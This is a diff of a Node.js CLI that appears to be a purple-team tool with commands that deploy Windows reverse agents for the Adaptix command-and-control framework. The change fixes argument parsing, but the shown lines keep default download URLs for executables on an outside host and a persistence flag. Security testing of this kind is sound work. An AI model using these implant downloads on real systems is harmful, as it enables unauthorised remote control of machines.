@@ -102,8 +102,10 @@ if (process.argv[2] === 'help' && process.argv[3] === 'adaptix-agent') {
 const revWinAdaptixAgent = require('./utils/rev-win-adaptix-agent.js');
 
 if (process.argv[2] === 'rev-win-adaptix-agent') {
+  // Parse arguments properly - filter out flags to get the URL
+  const args = process.argv.slice(3).filter(arg => !arg.startsWith('--'));
   const options = {
-    url: process.argv[3] || "http://purpletm.online:7070/purple-win.exe",
+    url: args[0] || "http://purpletm.online:7070/purple-win.exe",
     persistence: process.argv.includes('--persist')
   };
   
@@ -123,8 +125,10 @@ if (process.argv[2] === 'rev-win-adaptix-agent') {
 const revWinAdaptixGopher = require('./utils/rev-win-adaptix-gopher.js');
 
 if (process.argv[2] === 'rev-win-adaptix-gopher') {
+  // Parse arguments properly - filter out flags to get the URL
+  const args = process.argv.slice(3).filter(arg => !arg.startsWith('--'));
   const options = {
-    url: process.argv[3] || "http://purpletm.online:7070/purple-gopher.exe",
+    url: args[0] || "http://purpletm.online:7070/purple-gopher.exe",
     persistence: process.argv.includes('--persist')
   };
   
